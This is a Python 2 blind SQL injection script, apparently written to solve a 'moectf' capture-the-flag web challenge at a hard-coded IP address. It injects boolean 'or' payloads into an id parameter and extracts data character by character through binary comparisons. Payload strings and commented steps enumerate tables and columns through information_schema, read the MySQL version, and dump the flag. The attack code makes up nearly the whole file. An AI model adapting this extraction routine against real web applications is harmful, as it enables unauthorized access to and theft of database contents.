#!/usr/bin/env python2
import sys
import requests as req

if sys.version_info.major == 3:
    sys.exit("[-] QvQ... Plz use python2")

URL = "http://115.159.205.137:8000/?id={id}%23"


def get(_id):
    url = URL.format(id=_id)
    # print("[+] %s" % url)
    res = req.get(url)
    if res.status_code == 200:
        html = res.content.decode("utf-8")
        # print(html)
        if html:
            return 1
    return 0


def test(_id):
    url = URL.format(id=_id)
    res = req.get(url)
    if res.status_code == 200:
        html = res.content.decode("utf-8")
        print(html)


def toB(s):
    try:
        # return bin(int(s.encode('hex')))[2:]
        return bin(int(s.encode('hex'), 16))[2:]
    except Exception as e:
        print(e)
    return 0


TABLE_ALL = "moectf{}_h3r1sqwryuipadgjklzxvbn,.-24567890QWERTYUIOPASDFGHJKLZXCVBNM"
# TABLE_NUM = "1234567890"

SUBSTR = "right(left({data},{pos}),1)"


def p(s):
    sys.stdout.write(s)
    sys.stdout.flush()


def length(s="version()"):
    print("[+] Starting to test length for '%s'" % s)
    r = 0
    for i in range(100):
        p("%d..." % i)
        pl = "0' or (select length(%s)-%d from dual limit 1)" % (s, i)
        if not get(pl):
            r = i
            print("\n[+] Length : %d " % i)
            break
    return r


def version():
    _pl = "version()"
    # _len = length(_pl)
    _len = 23
    result = ""
    for pos in range(1, _len + 1):
        print("[-] Test %d" % pos)
        for c in TABLE_ALL:
            p("%s..." % c)
            pl = "0' or (select conv(hex(%s),16,2)-%s from dual limit 1)" % (
                SUBSTR.format(data=_pl, pos=pos), toB(c))
            res = get(pl)
            if not res:
                # print("\n[-] Pos %d : %s" % (pos, c))
                result += c
                break
        print("\n[!] %s" % result)
    print("[+] Result : %s" % result)


def flag(_pl):
    _len = 24
    result = ""
    for pos in range(1, _len + 1):
        print("[-] Test %d" % pos)
        for c in TABLE_ALL:
            p("%s..." % c)
            pl = "0' or (select conv(hex(%s),16,2)-%s from dual limit 1)" % (
                SUBSTR.format(data=_pl, pos=pos), toB(c))
            res = get(pl)
            if not res:
                # print("\n[-] Pos %d : %s" % (pos, c))
                result += c
                break
        print("\n[!] %s" % result)
    print("[+] Result : %s" % result)


def select(_pl):
    _len = length(_pl)
    if not _len:
        return False
    result = ""
    for pos in range(1, _len + 1):
        print("[-] Test %d" % pos)
        for c in TABLE_ALL:
            p("%s..." % c)
            pl = "0' or (select conv(hex(%s),16,2)-%s from dual limit 1)" % (
                SUBSTR.format(data=_pl, pos=pos), toB(c))
            res = get(pl)
            if not res:
                # print("\n[-] Pos %d : %s" % (pos, c))
                result += c
                break
        print("\n[!] %s" % result)
    print("[+] Result : %s" % result)


if __name__ == '__main__':
    pl = "1'"
    # this is a very baby sqli
    pl = "2'"
    # maybe you need to know what is blind-injection
    pl = "3'%23flag"
    pl = "(select group_concat(table_name) from information_schema.tables where database() in (table_schema))"
    # articals,moectf
    # select(pl)
    pl = "(select group_concat(column_name) from information_schema.columns where 'moectf' in (table_name))"
    # articals,moectf
    # select(pl)
    # Now, have fun and hack!
    # pl = "0' or (select hex(%s)-%d from dual limit 1)" % (
    #     SUBSTR.format(data="version()", pos=1), 35)

    # pl = "3'%23" + sys.argv[1] if len(sys.argv) >= 2 else ""
    # test(pl)
    # select table_name from information_schema.tables where database() in (table_schema) and table_name ='tablename'
    # select group_concat(table_name) from information_schema.tables where database() in (table_schema);
    #
    #
    # false or true()
    #   select 0 false
    #   select 1 true
    #   select 2-1 true
    #   select 2-2 false

    # length("version()")
    # version()
    # 5.7.23-0ubuntu0.16.04.1
    flag("(select flag from moectf limit 1)")
    # for i in TABLE_ALL:
    #     print(i, toB(i))
    print()
